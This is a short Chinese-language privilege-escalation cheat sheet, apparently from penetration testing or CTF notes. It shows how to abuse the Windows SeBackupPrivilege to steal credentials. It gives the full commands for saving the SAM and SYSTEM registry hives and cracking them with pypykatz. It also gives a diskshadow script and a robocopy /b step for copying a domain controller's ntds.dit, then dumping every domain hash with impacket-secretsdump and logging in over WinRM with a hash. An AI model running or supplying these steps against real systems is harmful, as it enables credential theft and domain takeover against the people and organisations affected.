	>whoami /priv 可以看到SeBackupPrivilege状态是Enabled
	可以导出SYSTEM文件破解密码
	>reg save hklm\sam c:\Temp\sam
	>reg save hklm\system c:\Temp\system
	>pypykatz registry --sam sam system
	域环境下
	>whoami /priv 可以看到SeBackupPrivilege和SeRestorePrivilege状态是Enabled
	攻击机kali新建文件raj.dsh，内容为
	set context persistent nowriters
	add volume c: alias raj
	create
	expose %raj% z:
	执行命令
	unix2dos raj.dsh
	传至靶机执行
	>diskshadow /s raj.dsh
	>robocopy /b z:\windows\ntds . ntds.dit
	>reg save hklm\system c:\Temp\system
	kali中执行
	>impacket-secretsdump -ntds ntds.dit -system system local
	可使用winrm哈希方式登录